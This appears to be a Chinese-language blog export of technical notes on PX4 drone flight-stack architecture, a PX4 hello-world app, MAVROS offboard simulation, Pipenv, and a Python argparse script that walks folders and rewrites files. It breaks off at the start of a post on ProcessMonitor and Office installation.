<h2 id="飞行控制栈"><a href="#飞行控制栈" class="headerlink" title="飞行控制栈"></a>飞行控制栈</h2><p>飞行控制栈是自主无人机的引导、导航和控制算法的集合。它包括用于固定翼，多旋翼和垂直起降机身的控制器以及用于姿态和位置的估计器。</p>
<p>图2显示了飞行控制栈的构建块的预览。 它包含从传感器，RC输入和自主飞行控制（导航器）到电机或伺服控制（执行器）的完整管道。</p>
<p align="center">
    <img src="images/PX4_High-Level_Flight-Stack.svg" width="90%" alt="PX4飞行控制栈结构图"/>
</p>
<center>图2  PX4飞行控制栈结构图</center>

<p><strong>估计器</strong>采用一个或多个传感器输入，组合它们，并计算无人机状态（例如来自IMU传感器数据的姿态）。</p>
<p><strong>控制器</strong>是将设定值和测量或估计状态（过程变量）作为输入的组件。 其目标是调整过程变量的值，使其与设定值匹配。 输出是最终达到该设定点的校正。 例如，位置控制器将位置设定点作为输入，过程变量是当前估计的位置，输出是将车辆移向期望位置的姿态和推力设定点。</p>
<p><strong>混合器</strong>接受强制命令（例如向右转）并将它们转换为单独的电机命令，同时确保不超过某些限制。 该平移特定于无人机类型并且取决于各种因素，例如关于重心的马达布置或无人机的转动惯量。</p>
<h2 id="中间件"><a href="#中间件" class="headerlink" title="中间件"></a>中间件</h2><p>中间件主要包括嵌入式传感器的设备驱动程序，与外部世界的通信（协同计算机，地面控制站等）和uORB发布 - 订阅消息总线。</p>
<p>此外，中间件包括一个模拟层，允许PX4飞行代码在桌面操作系统上运行，并在模拟的“世界”中控制计算机建模的无人机。</p>
<h2 id="更新速率"><a href="#更新速率" class="headerlink" title="更新速率"></a>更新速率</h2><p>由于模块等待消息更新，因此驱动程序通常会定义模块更新的速度。 大多数IMU驱动器以1kHz采样数据，将其集成并以250Hz发布。 系统的其他部分，例如导航器，不需要如此高的更新速率，因此运行速度相当慢。</p>
<p>可以通过运行uorb top在系统上实时检查消息更新率。</p>
<h2 id="运行时环境"><a href="#运行时环境" class="headerlink" title="运行时环境"></a>运行时环境</h2><p>PX4可在各种提供POSIX-API的操作系统上运行（例如Linux，macOS，NuttX或QuRT）。 它还应该具有某种形式的实时调度（例如FIFO）。</p>
<p>模块间通信（使用uORB）基于共享内存。 整个PX4中间件在单个地址空间中运行，即在所有模块之间共享存储器。</p>
<p>有两种不同的方式可以执行模块：</p>
<ul>
<li><p><strong>任务</strong>：模块在自己的任务中运行，具有自己的堆栈和进程优先级（这是更常见的方式）。</p>
</li>
<li><p><strong>工作队列</strong>：模块在共享任务上运行，这意味着它不拥有堆栈。 多个任务在同一堆栈上运行，每个工作队列具有一个优先级。</p>
<p>通过指定将来的固定时间来安排任务。 优点是它使用较少的RAM，但不允许任务在消息上休眠或轮询。</p>
<p>工作队列用于周期性任务，例如传感器驱动器或陆地探测器。</p>
</li>
</ul>
<h2 id="操作系统相关信息"><a href="#操作系统相关信息" class="headerlink" title="操作系统相关信息"></a>操作系统相关信息</h2><h3 id="NuttX"><a href="#NuttX" class="headerlink" title="NuttX"></a>NuttX</h3><p>NuttX是在飞行控制板上运行PX4的主要RTOS。 它是开源（BSD许可证），重量轻，高效且非常稳定。</p>
<p>模块作为任务执行：它们有自己的文件描述符列表，但它们共享一个地址空间。 任务仍然可以启动共享文件描述符列表的一个或多个线程。</p>
<p>每个任务/线程都有一个固定大小的堆栈，并且有一个周期性任务，它检查所有堆栈是否有足够的可用空间（基于堆栈着色）。</p>
<h3 id="Linux-MacOS"><a href="#Linux-MacOS" class="headerlink" title="Linux / MacOS"></a>Linux / MacOS</h3><p>在Linux或macOS上，PX4在单个进程中运行，并且模块在它们自己的线程中运行（NuttX上的任务和线程之间没有区别）。</p>
<h1 id="PX4飞行模式"><a href="#PX4飞行模式" class="headerlink" title="PX4飞行模式"></a>PX4飞行模式</h1><p>飞行模式定义了系统在任何给定时间的状态。用户可以使用远程遥控器或者QGroundControl地面站来进行飞行模式切换。</p>
<p align="center">
    <img src="images/commander-flow-diagram.png" width="90%" alt="PX4飞行模式控制流程图"/>
</p>
<center>图3  PX4飞行模式控制流程图</center>

<h1 id="Dronecode平台软硬件架构"><a href="#Dronecode平台软硬件架构" class="headerlink" title="Dronecode平台软硬件架构"></a>Dronecode平台软硬件架构</h1><p>Dronecode是开源的无人机平台，其软硬件体系结构如图4所示。图4左侧显示了一种可能的硬件配置，其中飞行控制器（浅蓝色）通过RTPS连接到感知计算机（深蓝色）。 感知计算机使用相机传感器阵列提供视觉控制和物体避免，并且具有单独的有效载荷相机。</p>
<p>图的右侧显示了端到端软件堆栈。 堆栈“近似”水平对齐图表的硬件部分，并进行颜色编码，以显示飞行控制器上运行的软件以及配套计算机上的软件。</p>
<p align="center">
    <img src="images/dronecode_platform_architecture.jpg" width="90%" alt="Dronecode平台软硬件架构"/>
</p>
<center>图4  Dronecode平台软硬件架构</center>

<h1 id="PX4位姿控制"><a href="#PX4位姿控制" class="headerlink" title="PX4位姿控制"></a>PX4位姿控制</h1><h2 id="多旋翼位置控制"><a href="#多旋翼位置控制" class="headerlink" title="多旋翼位置控制"></a>多旋翼位置控制</h2><p align="center">
    <img src="images/px4_mc_position_controller_diagram.png" width="90%" alt="PX4多旋翼位置控制"/>
</p>
<center>图5  PX4多旋翼位置控制</center>

<h1 id="混合和执行器"><a href="#混合和执行器" class="headerlink" title="混合和执行器"></a>混合和执行器</h1><p>PX4架构保证了核心控制器中不需要针对机身布局做特别处理。</p>
<p>混控指的是把输入指令（例如：遥控器打右转）分配到电机以及舵机的执行器（如电调或舵机PWM）指令。对于固定翼的副翼控制而言，每个副翼由一个舵机控制，那么混控的意义就是控制其中一个副翼抬起而另一个副翼落下。同样的，对多旋翼而言，俯仰操作需要改变所有电机的转速。</p>
<p>将混控逻辑从实际姿态控制器中分离出来可以大大提高复用性。</p>
<h2 id="控制管线"><a href="#控制管线" class="headerlink" title="控制管线"></a>控制管线</h2><p>一个特定的控制器（如姿态控制器）发送特定的归一化（-1..+1）的命令到给混合（mixing）,然后混合后输出独立的PWM到执行器（电调，舵机等）.在经过输出驱动如（串口，UAVCAN，PWM）等将归一化的值再转回特性的值（如输出1300的PWM等）。</p>
<p align="center">
    <img src="images/control_pipeline.jpg" width="90%" alt="PX4控制管线"/>
</p>
<center>图6  PX4控制管线</center>

<h2 id="控制组"><a href="#控制组" class="headerlink" title="控制组"></a>控制组</h2><p>PX4 有输入组和输出组的概念，顾名思义：控制输入组（如： attitude），就是用于核心的飞行姿态控制，（如： gimbal ）就是用于挂载控制. 一个输出组就是一个物理总线，如前8个PWM组成的总线用于舵机控制，组内带8个归一化（-1..+1）值,一个混合就是用于输入和输出连接方式（如:对于四轴来说,输入组有俯仰，翻滚，偏航等，对于于向前打俯仰操作，就需要改变输出组中的4个电调的PWM输出值，前俩个降低转速，后两个增加转速，飞机就向前）。</p>
<p>对于简单的固定翼来说，输入0（roll），就直接连接到输出的0（副翼）。对于多旋翼来说就不同了，输入0（roll）需要连接到所有的4个电机。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://dev.px4.io/en/" target="_blank" rel="noopener">PX4 Development Guide (STABLE - v1.8.2)</a>,by Dronecode.</li>
<li><a href="https://dev.px4.io/zh/" target="_blank" rel="noopener">PX4开发指南</a>, by Dronecode.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>无人机</tag>
        <tag>飞行仿真</tag>
        <tag>PX4</tag>
      </tags>
  </entry>
  <entry>
    <title>PX4应用开发简要教程</title>
    <url>/2019/04/29/PX4%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91%E7%AE%80%E8%A6%81%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<p>本文说明如何创建和运行第一个板载应用程序。 它涵盖了PX4上应用程序开发所需的所有基本概念和API。</p>
<h1 id="开发环境"><a href="#开发环境" class="headerlink" title="开发环境"></a>开发环境</h1><p>在开发第一个PX4应用程序之前，需要构建如下开发环境：</p>
<ul>
<li>PX4 SITL模拟器或兼容PX4的飞行控制器。</li>
<li>PX4开发工具链用于所需目标。</li>
<li>从Github下载PX4源代码</li>
</ul>
<h1 id="简单应用"><a href="#简单应用" class="headerlink" title="简单应用"></a>简单应用</h1><h2 id="代码编写"><a href="#代码编写" class="headerlink" title="代码编写"></a>代码编写</h2><p>本节创建一个最小的应用，仅用于打印Hello Sky！。整个应用由一个简单C文件和一个cmake定义文件构成。具体步骤如下：</p>
<ol>
<li>创建目录Firmware/src/examples/px4_simple_app</li>
<li>在上述目录中创建C文件px4_simple_app.c</li>
<li>在上述目录中创建cmake定义文件CMakeLists.txt</li>
</ol>
<p>px4_simple_app.c代码内容如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * @file px4_simple_app.c</span><br><span class="line"> * Minimal application example for PX4 autopilot</span><br><span class="line"> *</span><br><span class="line"> * @author Example User &lt;mail@example.com&gt;</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line">#include &lt;px4_log.h&gt;</span><br><span class="line"></span><br><span class="line">__EXPORT int px4_simple_app_main(int argc, char *argv[]);</span><br><span class="line"></span><br><span class="line">int px4_simple_app_main(int argc, char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">    PX4_INFO(&quot;Hello Sky!&quot;);</span><br><span class="line">    return OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>CMakeLists.txt文件内容如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">px4_add_module(</span><br><span class="line">    MODULE examples__px4_simple_app</span><br><span class="line">    MAIN px4_simple_app</span><br><span class="line">    STACK_MAIN 2000</span><br><span class="line">    SRCS</span><br><span class="line">        px4_simple_app.c</span><br><span class="line">    DEPENDS</span><br><span class="line">        platforms__common</span><br><span class="line">    )</span><br></pre></td></tr></table></figure>

<p>px4_add_module()方法从模块描述构建静态库。 MAIN块列出了模块的名称 。这会将该模块与NuttX一起注册，以便可以从PX4 shell或SITL控制台调用它。</p>
<h2 id="编译链接"><a href="#编译链接" class="headerlink" title="编译链接"></a>编译链接</h2><p>针对不同的目标平台，使用不同的make命令构建：</p>
<ul>
<li>jMAVSim Simulator: make posix_sitl_default jmavsim</li>
<li>Pixhawk v1/2: make px4fmu-v2_default</li>
<li>Pixhawk v3: make px4fmu-v4_default</li>
</ul>
<h2 id="测试应用（硬件）"><a href="#测试应用（硬件）" class="headerlink" title="测试应用（硬件）"></a>测试应用（硬件）</h2><h3 id="上传固件到开发板"><a href="#上传固件到开发板" class="headerlink" title="上传固件到开发板"></a>上传固件到开发板</h3><p>在开发板上测试，使用如下命令上传PX4固件：</p>
<ul>
<li>Pixhawk v1/2: make px4fmu-v2_default upload</li>
<li>Pixhawk v3: make px4fmu-v4_default upload</li>
</ul>
<h3 id="连接控制台"><a href="#连接控制台" class="headerlink" title="连接控制台"></a>连接控制台</h3><p>现在通过串口或USB连接到系统控制台。 点击ENTER将弹出shell提示符：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nsh&gt;</span><br><span class="line">nsh&gt;help</span><br><span class="line">nsh&gt; px4_simple_app</span><br><span class="line">Hello Sky!</span><br></pre></td></tr></table></figure>

<h2 id="测试应用（SITL）"><a href="#测试应用（SITL）" class="headerlink" title="测试应用（SITL）"></a>测试应用（SITL）</h2><p>如果您正在使用SITL，PX4控制台将自动启动。 与nsh控制台一样，您可以键入help以查看内置应用程序列表。</p>
<p>输入px4_simple_app以运行最小应用程序。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pxh&gt; px4_simple_app</span><br><span class="line">INFO  [px4_simple_app] Hello Sky!</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://huangwang.github.io/2019/04/26/PX4编译开发环境配置/">PX4编译开发环境配置</a>,by jackhuang.</li>
<li><a href="https://huangwang.github.io/2019/04/27/PX4开发基本概念解读/">PX4开发基本概念解读</a>,by jackhuang.</li>
<li><a href="https://dev.px4.io/en/apps/hello_sky.html" target="_blank" rel="noopener">First Application Tutorial (Hello Sky)</a>,by dronecode.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>飞行仿真</tag>
      </tags>
  </entry>
  <entry>
    <title>PX4软件在环仿真之MAVROS外部控制</title>
    <url>/2019/05/15/PX4%E8%BD%AF%E4%BB%B6%E5%9C%A8%E7%8E%AF%E4%BB%BF%E7%9C%9F%E4%B9%8BMAVROS%E5%A4%96%E9%83%A8%E6%8E%A7%E5%88%B6/</url>
    <content><![CDATA[<p>PX4软件在环仿真之MAVROS外部控制将使用基于MAVROS的PX4外部控制ROS节点，控制在Gazebo仿真环境中的四悬翼无人机,如图1所示。</p>
<p align="center">
    <img src="images/px4_sitl_overview.png" width="90%" alt="px4软件在环仿真"/>
</p>
<center>图1  px4软件在环仿真</center>

<p>具体步骤如下：</p>
<h1 id="构建PX4自驾仪"><a href="#构建PX4自驾仪" class="headerlink" title="构建PX4自驾仪"></a>构建PX4自驾仪</h1><p>请参考<a href="https://huangwang.github.io/2019/04/26/PX4编译开发环境配置/">PX4编译开发环境配置</a>和<a href="https://dev.px4.io/en/setup/dev_env_linux.html#gazebo-with-ros" target="_blank" rel="noopener">Development Environment on Linux</a>配置PX4编译开发环境。需要指出的是，为使用Gazebo仿真环境，PX4开发工具链使用脚本<a href="https://raw.githubusercontent.com/PX4/Devguide/master/build_scripts/ubuntu_sim_ros_gazebo.sh" target="_blank" rel="noopener">ubuntu_sim_ros_gazebo.sh</a>构建。</p>
<p>PX4编译开发环境配置完成后，使用如下命令启动：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cd ~&#x2F;src&#x2F;Firmware</span><br><span class="line">$ make posix_sitl_default gazebo</span><br></pre></td></tr></table></figure>

<h1 id="安装MAVROS"><a href="#安装MAVROS" class="headerlink" title="安装MAVROS"></a>安装MAVROS</h1><p>安装MAVROS请参考<a href="https://huangwang.github.io/2019/05/10/Ubuntu16-04%E5%AE%89%E8%A3%85MAVROS/">Ubuntu16.04安装MAVROS</a>，完成后使用如下命令启动MAVROS:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ roscore</span><br><span class="line"># 启动MAVROS,链接到本地ROS</span><br><span class="line">$ roslaunch mavros px4.launch fcu_url:&#x3D;&quot;udp:&#x2F;&#x2F;:14540@127.0.0.1:14557&quot;</span><br></pre></td></tr></table></figure>

<h1 id="构建Offboard示例程序"><a href="#构建Offboard示例程序" class="headerlink" title="构建Offboard示例程序"></a>构建Offboard示例程序</h1><p>ROS节点Offboard示例程序的构建请参考<a href="https://huangwang.github.io/2019/05/15/ROS构建Package和Node的教程/">ROS构建Package和Node的教程</a>，完成后使用如下命令启动Offboard示例程序：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cd catkin_ws&#x2F;</span><br><span class="line">$ source devel&#x2F;setup.bash</span><br><span class="line">$ rosrun offboard offboard_node</span><br></pre></td></tr></table></figure>

<p>最终能够在Gazebo仿真环境中观察到四悬翼无人机垂直起飞到2米的高度。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://huangwang.github.io/2019/05/10/Ubuntu16-04%E5%AE%89%E8%A3%85MAVROS/">Ubuntu16.04安装MAVROS</a>,by jackhuang.</li>
<li><a href="https://huangwang.github.io/2019/05/15/ROS构建Package和Node的教程/">ROS构建Package和Node的教程</a>,by jackhuang.</li>
<li><a href="https://huangwang.github.io/2019/04/26/PX4编译开发环境配置/">PX4编译开发环境配置</a>,by jackhuang.</li>
<li><a href="https://dev.px4.io/en/setup/dev_env_linux.html#gazebo-with-ros" target="_blank" rel="noopener">Development Environment on Linux</a>, by dronecode.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>PX4</tag>
        <tag>Gazebo</tag>
      </tags>
  </entry>
  <entry>
    <title>Pipenv最新一代Python项目环境与依赖管理工具</title>
    <url>/2021/09/21/Pipenv%E6%9C%80%E6%96%B0%E4%B8%80%E4%BB%A3Python%E9%A1%B9%E7%9B%AE%E7%8E%AF%E5%A2%83%E4%B8%8E%E4%BE%9D%E8%B5%96%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<p>Pipenv是一个工具，旨在将所有打包世界（bundler、composer、npm、cargo、yarn 等）中最好的东西带到 Python 世界。在我们的世界中，Windows 是一等公民。</p>
<p>它会自动为您的项目创建和管理 virtualenv，并Pipfile在您安装/卸载软件包时从您的项目中添加/删除软件包。它还生成Pipfile.lock用于生成确定性构建的 ever-important 。</p>
<p>Pipenv 主要旨在为应用程序的用户和开发人员提供一种设置工作环境的简单方法。</p>
<p>Pipenv 寻求解决的问题是多方面的：</p>
<ul>
<li>您不再需要单独使用pip和virtualenv。他们一起工作。</li>
<li>管理requirements.txt文件可能会有问题，因此 Pipenv 使用* * Pipfile并将Pipfile.lock抽象依赖声明与上次测试的组合分开。</li>
<li>哈希值无处不在，总是如此。安全。自动暴露安全漏洞。</li>
<li>强烈鼓励使用最新版本的依赖项，以尽量减少过时组件带来的安全风险。</li>
<li>让您深入了解您的依赖关系图（例如）。$ pipenv graph</li>
<li>通过加载.env文件简化开发工作流程。</li>
</ul>
<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>如果您已经拥有 Python 和 pip，您可以轻松地将 Pipenv 安装到您的主目录中：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ pip install pipenv</span><br></pre></td></tr></table></figure>

<h1 id="创建虚拟环境"><a href="#创建虚拟环境" class="headerlink" title="创建虚拟环境"></a>创建虚拟环境</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cd your_project_dir</span><br><span class="line">$ pipenv install</span><br></pre></td></tr></table></figure>

<h1 id="激活虚拟环境"><a href="#激活虚拟环境" class="headerlink" title="激活虚拟环境"></a>激活虚拟环境</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pipenv shell</span><br></pre></td></tr></table></figure>

<h1 id="安装依赖到虚拟环境"><a href="#安装依赖到虚拟环境" class="headerlink" title="安装依赖到虚拟环境"></a>安装依赖到虚拟环境</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ pipenv install Scrapy</span><br></pre></td></tr></table></figure>

<h1 id="记录依赖"><a href="#记录依赖" class="headerlink" title="记录依赖"></a>记录依赖</h1><p>使用Pipenv时，什么都不必做，Pipenv会自动帮你管理依赖。Pipenv会在你创建虚拟环境时自动创建Pipfile和Pipfile.lock文件（如果不存在），并且会在你使用pipenv install和pipenv uninstall命令安装和卸载包时自动更新Pipfile和Pipfile.lock。</p>
<h1 id="在部署环境安装依赖"><a href="#在部署环境安装依赖" class="headerlink" title="在部署环境安装依赖"></a>在部署环境安装依赖</h1><p>使用Pipenv则只需要执行pipenv install，它会自动安装Pipfile中记录的依赖：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ pipenv install</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://huangwang.github.io/2018/10/09/Virtualenv%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/">Virtualenv简易教程</a>,by jackhuang.</li>
<li><a href="https://zhuanlan.zhihu.com/p/60647332" target="_blank" rel="noopener">最全的Python虚拟环境使用方法</a>,by Stevent.</li>
<li><a href="https://zhuanlan.zhihu.com/p/37581807" target="_blank" rel="noopener">Pipenv：新一代Python项目环境与依赖管理工具</a>,by 李辉.</li>
<li><a href="https://zhuanlan.zhihu.com/p/109939711" target="_blank" rel="noopener">Python 修改 pip 源为国内源</a>,by 花晓星辰.</li>
<li><a href="https://www.jianshu.com/p/d4af07d5af27" target="_blank" rel="noopener">pip安装包时出现 ValueError: check_hostname requires server_hostname 错误</a>,by 胡小包.</li>
<li><a href="https://blog.csdn.net/m0_37469948/article/details/106188587" target="_blank" rel="noopener">pyenv install build failed:Fatal: You must get working getaddrinfo() function.</a>,by Honcy Ye.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python命令行参数解析示例</title>
    <url>/2019/06/29/Python%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%8F%82%E6%95%B0%E8%A7%A3%E6%9E%90%E7%A4%BA%E4%BE%8B/</url>
    <content><![CDATA[<p>最新需要一个小程序实现解析命令行参数、遍历指定文件夹，处理指定扩展名的文件。于是简单用python实现一下。</p>
<h1 id="库选择"><a href="#库选择" class="headerlink" title="库选择"></a>库选择</h1><h2 id="参数解析"><a href="#参数解析" class="headerlink" title="参数解析"></a>参数解析</h2><h3 id="sys-argv"><a href="#sys-argv" class="headerlink" title="sys.argv"></a>sys.argv</h3><p>解析Python中命令行参数的最传统的方法是通过sys.argv。但这种方法比较古老，灵活性很差，同时解析出来的参数都是str类型。但在编写简单脚本，参数较少且固定时比较方便。</p>
<h3 id="getopt模块"><a href="#getopt模块" class="headerlink" title="getopt模块"></a>getopt模块</h3><p>getopt模块是专门处理命令行参数的模块，用于获取命令行选项和参数，也就是sys.argv。命令行选项使得程序的参数更加灵活。支持短选项模式（-）和长选项模式（–）。</p>
<h3 id="optparse模块"><a href="#optparse模块" class="headerlink" title="optparse模块"></a>optparse模块</h3><p>optparse，功能强大，易于使用，可以方便地生成标准的、符合Unix/Posix 规范的命令行说明。但在Python2.7后就已经弃用不再维护。</p>
<h3 id="argparse模块"><a href="#argparse模块" class="headerlink" title="argparse模块"></a>argparse模块</h3><p>argparse模块是Python内置的参数解析模块，使用起来比较简单且功能强大。</p>
<p>ArgumentParser类创建时的参数如下：</p>
<ul>
<li>prog - 程序的名字（默认：sys.argv[0]）</li>
<li>usage - 描述程序用法的字符串（默认：从解析器的参数生成）</li>
<li>description - 参数帮助信息之前的文本（默认：空）</li>
<li>epilog - 参数帮助信息之后的文本（默认：空）</li>
<li>parents - ArgumentParser 对象的一个列表，这些对象的参数应该包括进去</li>
<li>formatter_class - 定制化帮助信息的类</li>
<li>prefix_chars - 可选参数的前缀字符集（默认：‘-‘）</li>
<li>fromfile_prefix_chars - 额外的参数应该读取的文件的前缀字符集（默认：None）</li>
<li>argument_default - 参数的全局默认值（默认：None）</li>
<li>conflict_handler - 解决冲突的可选参数的策略（通常没有必要）</li>
<li>add_help - 给解析器添加-h/–help 选项（默认：True）</li>
</ul>
<p>add_argument函数的参数如下：</p>
<ul>
<li>name or flags - 选项字符串的名字或者列表，例如foo 或者-f, –foo。</li>
<li>action - 在命令行遇到该参数时采取的基本动作类型。</li>
<li>nargs - 应该读取的命令行参数数目。</li>
<li>const - 某些action和nargs选项要求的常数值。</li>
<li>default - 如果命令行中没有出现该参数时的默认值。</li>
<li>type - 命令行参数应该被转换成的类型。</li>
<li>choices - 参数可允许的值的一个容器。</li>
<li>required - 该命令行选项是否可以省略（只针对可选参数）。</li>
<li>help - 参数的简短描述。</li>
<li>metavar - 参数在帮助信息中的名字。</li>
<li>dest - 给parse_args()返回的对象要添加的属性名称。</li>
</ul>
<h3 id="参数解析模块比较"><a href="#参数解析模块比较" class="headerlink" title="参数解析模块比较"></a>参数解析模块比较</h3><ul>
<li>getopt，只能简单的处理命令行参数，无法解析一个参数多个值的情况，如 –file file1 file2 file3。</li>
<li>optparse，功能强大，易于使用，可以方便地生成标准的、符合Unix/Posix 规范的命令行说明。但在Python2.7后就已经弃用不再维护。</li>
<li>argparse，使其更加容易的编写用户友好的命令行接口。它所需的程序进程了参数定义，argparse将更好的解析sys.argv。同时argparse模块还能自动生成帮助及用户输入错误参数时的提示信息。</li>
</ul>
<h2 id="文件夹遍历"><a href="#文件夹遍历" class="headerlink" title="文件夹遍历"></a>文件夹遍历</h2><p>文件夹遍历有两种方法：</p>
<ul>
<li>使用os.walk</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*- coding: utf-8 -*- </span><br><span class="line">import os </span><br><span class="line">def Test1(rootDir): </span><br><span class="line">    list_dirs &#x3D; os.walk(rootDir) </span><br><span class="line">    for root, dirs, files in list_dirs: </span><br><span class="line">        for d in dirs: </span><br><span class="line">            print os.path.join(root, d)      </span><br><span class="line">        for f in files: </span><br><span class="line">            print os.path.join(root, f)</span><br></pre></td></tr></table></figure>

<ul>
<li>使用os.listdir</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*- coding: utf-8 -*- </span><br><span class="line">import os </span><br><span class="line">def Test2(rootDir): </span><br><span class="line">    for lists in os.listdir(rootDir): </span><br><span class="line">        path &#x3D; os.path.join(rootDir, lists) </span><br><span class="line">        print path </span><br><span class="line">        if os.path.isdir(path): </span><br><span class="line">            Test2(path)</span><br></pre></td></tr></table></figure>

<h2 id="文件处理"><a href="#文件处理" class="headerlink" title="文件处理"></a>文件处理</h2><p>Python内置了读写文件的函数，用法和C是兼容的。本节介绍内容大致有：文件的打开/关闭、文件对象、文件的读写等。</p>
<h1 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h1><p>示例代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*- coding: utf-8 -*- </span><br><span class="line"></span><br><span class="line">import os </span><br><span class="line">import argparse</span><br><span class="line"></span><br><span class="line"># 遍历文件夹</span><br><span class="line">def traverse(pathName,extName):</span><br><span class="line">    extNameList&#x3D;extName.split(&#39; &#39;) </span><br><span class="line">    print(extNameList)</span><br><span class="line">    list_dirs &#x3D; os.walk(pathName) </span><br><span class="line">    for root, dirs, files in list_dirs:   </span><br><span class="line">        for f in files:</span><br><span class="line">            targetExt&#x3D;os.path.splitext(f)[-1]</span><br><span class="line">            if targetExt.lower() in extNameList:</span><br><span class="line">                clearWaterPrint(os.path.join(root, f))</span><br><span class="line"></span><br><span class="line">def clearWaterPrint(fileName):</span><br><span class="line">    print(fileName)</span><br><span class="line">    fileOrgin&#x3D;open(fileName,&#39;rb&#39;)</span><br><span class="line">    fileTarget&#x3D;open(fileName+&#39;.exe&#39;,&#39;wb&#39;)</span><br><span class="line">    fileTarget.write(fileOrgin.read())</span><br><span class="line">    fileOrgin.close()</span><br><span class="line">    os.remove(fileName)</span><br><span class="line">    fileTarget.close()</span><br><span class="line">    os.rename(fileName+&#39;.exe&#39;,fileName)</span><br><span class="line">  </span><br><span class="line"># Driver Code </span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;: </span><br><span class="line">    # 首先创建一个ArgumentParser对象</span><br><span class="line">    parser &#x3D; argparse.ArgumentParser(description&#x3D;&#39;Process the water print!&#39;)   </span><br><span class="line">    # 添加--path设置文件目录</span><br><span class="line">    parser.add_argument(&#39;-p&#39;,&#39;--path&#39;, type &#x3D; str,dest&#x3D;&#39;pathName&#39;, help&#x3D;&#39;give the path of directory&#39;,</span><br><span class="line">    default &#x3D; &#39;.&#x2F;&#39;)    </span><br><span class="line">    # 添加--ext设置文件目录</span><br><span class="line">    parser.add_argument(&#39;-e&#39;,&#39;--ext&#39;, type &#x3D; str,dest&#x3D;&#39;extName&#39;, help&#x3D;&#39;give the extension name of file&#39;,</span><br><span class="line">    default &#x3D; &#39;.doc .docx .wav .txt .xml .dot .html .jpg .png&#39;,nargs &#x3D; &#39;*&#39;)    </span><br><span class="line">    #返回一个命名空间,如果想要使用变量,可用args.attr</span><br><span class="line">    args &#x3D; parser.parse_args()</span><br><span class="line"></span><br><span class="line">    # Calling traverse() function </span><br><span class="line">    traverse(args.pathName,args.extName)</span><br></pre></td></tr></table></figure>

<p>使用方法如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 clearWaterPrint.py -h</span><br><span class="line">python3 clearWaterPrint.py -p &#x2F;home&#x2F;test -e .doc .ppt</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="http://noahsnail.com/2017/09/13/2017-09-13-Python%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%8F%82%E6%95%B0%E8%A7%A3%E6%9E%90/" target="_blank" rel="noopener">Python的命令行参数解析</a>,by Tyan.</li>
<li><a href="https://zhuanlan.zhihu.com/p/56961708" target="_blank" rel="noopener">Python中最好用的命令行参数解析工具</a>,by Mingle Wong.</li>
<li><a href="https://blog.51cto.com/laocao/525140" target="_blank" rel="noopener">Python遍历文件夹的两种方法比较</a>,by likecao.</li>
<li><a href="https://python3-cookbook.readthedocs.io/zh_CN/latest/c05/p04_read_write_binary_data.html" target="_blank" rel="noopener">读写字节数据</a>,by python3-cookbook.</li>
<li><a href="http://funhacks.net/explore-python/File-Directory/binary_file_io.html" target="_blank" rel="noopener">读写二进制文件</a>,by funhacks.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>ProcessMonitor监控软件安装过程</title>
    <url>/2022/02/26/ProcessMonitor%E7%9B%91%E6%8E%A7%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E8%BF%87%E7%A8%8B/</url>
    <content><![CDATA[<p>最近在安装Office2013的过程中，提示需要卸载已安装的Office2010，然而卸载了Office2010之后，依然提示该错误，无法安装Office2013。</p>
<p>分析其原因，可能是卸载Office2010不干净，在注册表中还存留Office2010的注册表信息，而当运行Office2013的Setup.exe安装程序时，刚好读到存留的Office2010注册表信息，于是Office2013的Setup.exe安装程序认为Office2010没有卸载，从而无法继续安装。</p>
